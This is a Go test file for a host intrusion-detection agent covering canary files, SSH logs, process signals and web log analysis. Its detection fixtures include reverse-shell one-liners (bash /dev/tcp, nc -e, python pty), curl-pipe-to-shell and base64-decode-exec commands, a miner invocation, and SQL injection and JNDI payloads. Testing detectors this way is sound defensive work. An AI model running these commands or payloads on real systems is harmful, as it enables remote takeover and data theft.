package agent

import (
	"context"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/akquisio-dev/vigil/internal/proto"
)

func TestParseAuthorizedKeys(t *testing.T) {
	data := []byte(`# comment
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl laptop
from="10.0.0.1,10.0.0.2",command="echo hi there" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl restricted key
garbage line
`)
	keys := ParseAuthorizedKeys(data)
	if len(keys) != 2 {
		t.Fatalf("want 2 keys, got %d", len(keys))
	}
	if keys[0].Comment != "laptop" || !strings.HasPrefix(keys[0].Fingerprint, "SHA256:") {
		t.Errorf("first key: %+v", keys[0])
	}
	if keys[1].Comment != "restricted key" || !strings.Contains(keys[1].Options, "command=") {
		t.Errorf("second key: %+v", keys[1])
	}
	if keys[0].Fingerprint != keys[1].Fingerprint {
		t.Error("same blob must give same fingerprint")
	}
}

func TestParseProcNetAddr(t *testing.T) {
	ip, port, err := parseProcNetAddr("0100007F:1F90")
	if err != nil || ip.String() != "127.0.0.1" || port != 8080 {
		t.Fatalf("got %v %d %v", ip, port, err)
	}
	ip, port, err = parseProcNetAddr("00000000000000000000000000000000:0016")
	if err != nil || ip.String() != "::" || port != 22 {
		t.Fatalf("got %v %d %v", ip, port, err)
	}
	ip, _, _ = parseProcNetAddr("00000000000000000000000001000000:0016")
	if ip.String() != "::1" {
		t.Fatalf("got %v", ip)
	}
}

func TestParseDockerNAT(t *testing.T) {
	dump := `*nat
-A DOCKER -i docker0 -j RETURN
-A DOCKER ! -i br-1 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.18.0.2:80
-A DOCKER -d 127.0.0.1/32 ! -i br-2 -p tcp -m tcp --dport 5432 -j DNAT --to-destination 172.19.0.3:5432
COMMIT`
	ports := ParseDockerNAT(dump)
	if len(ports) != 2 {
		t.Fatalf("want 2, got %d", len(ports))
	}
	if ports[0].Scope != "any" || ports[0].Port != 8080 || ports[0].Target != "172.18.0.2:80" {
		t.Errorf("exposed port: %+v", ports[0])
	}
	if ports[1].Scope != "loopback" || ports[1].Port != 5432 {
		t.Errorf("loopback port: %+v", ports[1])
	}
}

func TestSSHRegexes(t *testing.T) {
	m := reAccepted.FindStringSubmatch("Accepted publickey for root from 203.0.113.7 port 51234 ssh2: ED25519 SHA256:abcDEF123")
	if m == nil || m[1] != "publickey" || m[2] != "root" || m[3] != "203.0.113.7" || m[6] != "SHA256:abcDEF123" {
		t.Fatalf("accepted: %q", m)
	}
	if m := reAccepted.FindStringSubmatch("Accepted password for alice from 198.51.100.2 port 22 ssh2"); m == nil || m[1] != "password" {
		t.Fatalf("password: %q", m)
	}
	if m := reFailed.FindStringSubmatch("Failed password for invalid user admin from 198.51.100.9 port 4242 ssh2"); m == nil || m[2] != "admin" {
		t.Fatalf("failed: %q", m)
	}
	if m := reSudo.FindStringSubmatch("    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id"); m == nil || m[1] != "alice" || m[5] != "/usr/bin/id" {
		t.Fatalf("sudo: %q", m)
	}
}

func testAgent(t *testing.T) (*Agent, string) {
	root := t.TempDir()
	a := &Agent{cfg: &Config{CanaryRoots: []string{root}, MaxQueue: 100}, state: &State{Canaries: map[string]*CanaryState{}}}
	return a, root
}

func TestCanaryPathRules(t *testing.T) {
	a, root := testAgent(t)
	bad := []string{
		"/etc/shadow-copy",
		root,
		root + "/../x.txt",
		root + "/.ssh/authorized_keys",
		root + "/.bashrc",
		root + "/cron.d/job",
		root + "/systemd/x.txt",
		root + "/backup.sh",
		"relative/path",
	}
	for _, p := range bad {
		if err := a.validateCanaryPath(p); err == nil {
			t.Errorf("%s: expected refusal", p)
		}
	}
	if err := a.validateCanaryPath(root + "/backup/old-credentials.txt"); err != nil {
		t.Errorf("valid path refused: %v", err)
	}
}

func TestCanaryNeverFollowsSymlinks(t *testing.T) {
	a, root := testAgent(t)
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(root, "link")); err != nil {
		t.Fatal(err)
	}
	if _, err := a.placeCanary(proto.Canary{ID: "x", Type: "env", Path: root + "/link/secret.env"}); err == nil {
		t.Fatal("placing through a symlinked directory must fail")
	}
	if err := os.Symlink(filepath.Join(outside, "target"), filepath.Join(root, "file.env")); err != nil {
		t.Fatal(err)
	}
	if _, err := a.placeCanary(proto.Canary{ID: "y", Type: "env", Path: root + "/file.env"}); err == nil {
		t.Fatal("placing onto a symlink must fail")
	}
	if entries, _ := os.ReadDir(outside); len(entries) != 0 {
		t.Fatal("something was written outside the canary root")
	}
}

func TestCanaryNeverOverwrites(t *testing.T) {
	a, root := testAgent(t)
	p := root + "/existing.txt"
	os.WriteFile(p, []byte("real data"), 0o600)
	if _, err := a.placeCanary(proto.Canary{ID: "x", Type: "credentials", Path: p}); err == nil {
		t.Fatal("existing file must not be overwritten")
	}
	if b, _ := os.ReadFile(p); string(b) != "real data" {
		t.Fatal("existing file was changed")
	}
}

func TestCanaryLifecycle(t *testing.T) {
	a, root := testAgent(t)
	for _, typ := range proto.CanaryTypes {
		p := root + "/deep/dir/" + typ
		cs, err := a.placeCanary(proto.Canary{ID: typ, Type: typ, Path: p})
		if err != nil {
			t.Fatalf("%s: %v", typ, err)
		}
		fi, err := os.Stat(p)
		if err != nil || fi.Mode().Perm() != 0o600 || fi.Size() == 0 {
			t.Fatalf("%s: bad file %v %v", typ, fi, err)
		}
		if err := removeCanary(cs); err != nil {
			t.Fatalf("%s remove: %v", typ, err)
		}
		if _, err := os.Stat(p); !os.IsNotExist(err) {
			t.Fatalf("%s: still there", typ)
		}
	}
}

func TestRemoveRefusesReplacedFile(t *testing.T) {
	a, root := testAgent(t)
	p := root + "/c.txt"
	cs, err := a.placeCanary(proto.Canary{ID: "x", Type: "credentials", Path: p})
	if err != nil {
		t.Fatal(err)
	}
	os.Remove(p)
	os.WriteFile(p, []byte("someone else's file"), 0o600)
	if err := removeCanary(cs); err == nil {
		t.Fatal("a replaced file must not be deleted")
	}
}

func TestSSHKeyCanaryIsValid(t *testing.T) {
	key, err := GenerateCanary("ssh-key", map[string]string{"comment": "backup@test"})
	if err != nil {
		t.Fatal(err)
	}
	bin, err := exec.LookPath("ssh-keygen")
	if err != nil {
		t.Skip("ssh-keygen not installed")
	}
	f := filepath.Join(t.TempDir(), "k")
	os.WriteFile(f, key, 0o600)
	out, err := exec.Command(bin, "-y", "-f", f).CombinedOutput()
	if err != nil || !strings.HasPrefix(string(out), "ssh-ed25519 ") {
		t.Fatalf("ssh-keygen rejected the key: %s %v", out, err)
	}
}

func TestExecSignals(t *testing.T) {
	cases := []struct {
		e    ExecInfo
		want string
	}{
		{ExecInfo{Exe: "/usr/bin/ls", Comm: "ls", Cmdline: "ls -la", ParentComm: "bash"}, ""},
		{ExecInfo{Exe: "/usr/bin/bash", Comm: "bash", Cmdline: "bash -c npm run build", ParentComm: "node"}, ""},
		{ExecInfo{Exe: "/usr/bin/git", Comm: "git", Cmdline: "git pull", ParentComm: "sshd"}, ""},
		{ExecInfo{Exe: "/tmp/x", Comm: "x", Cmdline: "/tmp/x"}, "tmp_exe"},
		{ExecInfo{Exe: "/usr/bin/kworker", Deleted: true}, "deleted_exe"},
		{ExecInfo{Exe: "/usr/bin/bash", Comm: "bash", StdioSocket: true}, "shell_socket"},
		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c id", ParentComm: "nginx"}, "service_shell"},
		{ExecInfo{Exe: "/usr/bin/python3.12", Comm: "python3", Cmdline: "python3 -c x", ParentComm: "php-fpm8.3"}, "service_shell"},
		{ExecInfo{Exe: "/usr/bin/bash", Comm: "bash", Cmdline: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"}, "cmd_reverse_shell"},
		{ExecInfo{Exe: "/usr/bin/nc", Comm: "nc", Cmdline: "nc -e /bin/sh 203.0.113.9 4444"}, "cmd_reverse_shell"},
		{ExecInfo{Exe: "/usr/bin/python3", Comm: "python3", Cmdline: `python3 -c import socket,pty;s=socket.socket();s.connect(("x",1));pty.spawn("sh")`}, "cmd_reverse_shell"},
		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c curl -fsSL http://203.0.113.9/x.sh | sh"}, "cmd_download_exec"},
		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c wget http://x/a -O /tmp/a && chmod +x /tmp/a"}, "cmd_download_exec"},
		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c echo aWQ= | base64 -d | sh"}, "cmd_decode_exec"},
		{ExecInfo{Exe: "/opt/x/xmrig", Comm: "xmrig", Cmdline: "xmrig -o stratum+tcp://pool.example:3333 --donate-level 1"}, "cmd_miner"},
	}
	for _, c := range cases {
		got := strings.Join(c.e.signals(), ",")
		if c.want == "" && got != "" || c.want != "" && !strings.Contains(got, c.want) {
			t.Errorf("%q: got %q, want %q", c.e.Cmdline+c.e.Exe, got, c.want)
		}
	}
	var l procLimiter
	now := time.Now()
	for i := 0; i < procEventsPerMinute; i++ {
		if ok, _ := l.allow(now); !ok {
			t.Fatal("limit reached too early")
		}
	}
	if ok, _ := l.allow(now); ok {
		t.Fatal("limit not enforced")
	}
	if _, dropped := l.allow(now.Add(time.Minute)); dropped != 1 {
		t.Fatalf("dropped: %d", dropped)
	}
}

func TestWebLog(t *testing.T) {
	lines := []string{
		`203.0.113.9 - - [16/Oct/2026:11:07:24 +0000] "GET /.env HTTP/1.1" 404 178 "-" "zgrab/0.x"`,
		`203.0.113.9 - - [16/Oct/2026:11:07:25 +0000] "GET /wp-login.php HTTP/1.1" 404 178 "-" "zgrab/0.x"`,
		`203.0.113.9 - - [16/Oct/2026:11:07:26 +0000] "GET /.git/config HTTP/1.1" 404 178 "-" "zgrab/0.x"`,
		`198.51.100.7 - - [16/Oct/2026:11:07:27 +0000] "GET /?id=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 200 5244 "-" "sqlmap"`,
		`198.51.100.8 - - [16/Oct/2026:11:07:28 +0000] "GET / HTTP/1.1" 200 5244 "-" "${jndi:ldap://x/a}"`,
		`198.51.100.9 - - [16/Oct/2026:11:07:29 +0000] "POST /uploads/wso2.php HTTP/1.1" 200 120 "-" "curl"`,
		`192.0.2.50 - - [16/Oct/2026:11:07:30 +0000] "GET /impressum HTTP/1.1" 200 1988 "-" "Mozilla/5.0"`,
		`garbage line`,
	}
	var g webAgg
	for _, l := range lines {
		if r, ok := parseWebLine(l, "combined"); ok {
			g.add(r, nil)
		}
	}
	for i := 0; i < 12; i++ {
		g.add(webRequest{IP: "192.0.2.77", Method: "POST", URI: "/api/login", Status: 401}, []string{"/api/login"})
	}
	if r, ok := parseWebLine(`{"remote_addr":"192.0.2.1","request_method":"GET","request_uri":"/x","status":404,"http_user_agent":"a"}`, "json"); !ok || r.Status != 404 {
		t.Fatalf("json format: %+v", r)
	}
	evs := g.flush("/var/log/nginx/access.log")
	by := map[string]map[string]any{}
	for _, e := range evs {
		by[e.Data["ip"].(string)] = e.Data
	}
	if len(by) != 5 || by["192.0.2.50"] != nil {
		t.Fatalf("notable addresses: %v", by)
	}
	if by["203.0.113.9"]["probes"] != 3 {
		t.Fatalf("probes: %v", by["203.0.113.9"])
	}
	if k := by["198.51.100.7"]["exploit_kinds"].([]string); len(k) != 1 || k[0] != "sqli" || by["198.51.100.7"]["exploits_ok"] != 1 {
		t.Fatalf("sqli: %v", by["198.51.100.7"])
	}
	if k := by["198.51.100.8"]["exploit_kinds"].([]string); len(k) != 1 || k[0] != "jndi" {
		t.Fatalf("jndi in user agent: %v", by["198.51.100.8"])
	}
	if by["198.51.100.9"]["shells"] != 1 || by["192.0.2.77"]["logins"] != 12 {
		t.Fatalf("shell or logins: %v %v", by["198.51.100.9"], by["192.0.2.77"])
	}
}

func TestTailWebLogRotation(t *testing.T) {
	tailPoll, webFlush = 50*time.Millisecond, 600*time.Millisecond
	defer func() { tailPoll, webFlush = 2*time.Second, time.Minute }()
	dir := t.TempDir()
	path := dir + "/access.log"
	line := func(p string) string {
		return "203.0.113.9 - - [16/Oct/2026:11:07:24 +0000] \"GET " + p + " HTTP/1.1\" 404 1 \"-\" \"x\"\n"
	}
	os.WriteFile(path, []byte(line("/.env-before-start")+line("/.git/before")+line("/wp-login.php")), 0o644)
	a := &Agent{cfg: &Config{MaxQueue: 1000}, state: &State{Offsets: map[string]LogOffset{}}, flushNow: make(chan struct{}, 1)}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go a.tailWebLog(ctx, WebLog{Path: path})
	time.Sleep(200 * time.Millisecond)
	f, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0)
	f.WriteString(line("/.env") + line("/.git/config"))
	f.Close()
	time.Sleep(200 * time.Millisecond)
	os.Rename(path, path+".1")
	os.WriteFile(path, []byte(line("/phpmyadmin/")), 0o644)
	time.Sleep(900 * time.Millisecond)
	cancel()
	a.mu.Lock()
	defer a.mu.Unlock()
	probes := 0
	for _, e := range a.queue {
		if e.Type == "web.activity" {
			probes += e.Data["probes"].(int)
		}
	}
	if probes != 3 {
		t.Fatalf("want the 3 probes written after start (2 before and 1 after rotation), got %d", probes)
	}
}

func TestNetKey(t *testing.T) {
	if k := netKey(net.ParseIP("203.0.113.77")); k != "203.0.113.0/24" {
		t.Fatal(k)
	}
	if k := netKey(net.ParseIP("2001:db8:1234:5678::1")); k != "2001:db8:1234::/48" {
		t.Fatal(k)
	}
	if remoteWorthIt(net.ParseIP("127.0.0.1")) || !remoteWorthIt(net.ParseIP("10.90.0.1")) {
		t.Fatal("loopback is skipped, private addresses are reported")
	}
}

func TestUpdatesParsing(t *testing.T) {
	out := []byte("Listing... Done\nopenssl/noble-updates,noble-security 3.0.13-0ubuntu3.5 amd64 [upgradable from: 3.0.13-0ubuntu3.4]\nvim/noble-updates 2:9.1 amd64 [upgradable from: 2:9.0]\n")
	p := parseAptUpgradable(out)
	if len(p) != 2 || !p[0].security || p[1].security || p[0].name != "openssl" {
		t.Fatalf("%+v", p)
	}
	if !versionLess("6.8.0-45-generic", "6.8.0-147-generic") || versionLess("6.8.0-147-generic", "6.8.0-45-generic") {
		t.Fatal("kernel versions compare numerically")
	}
}
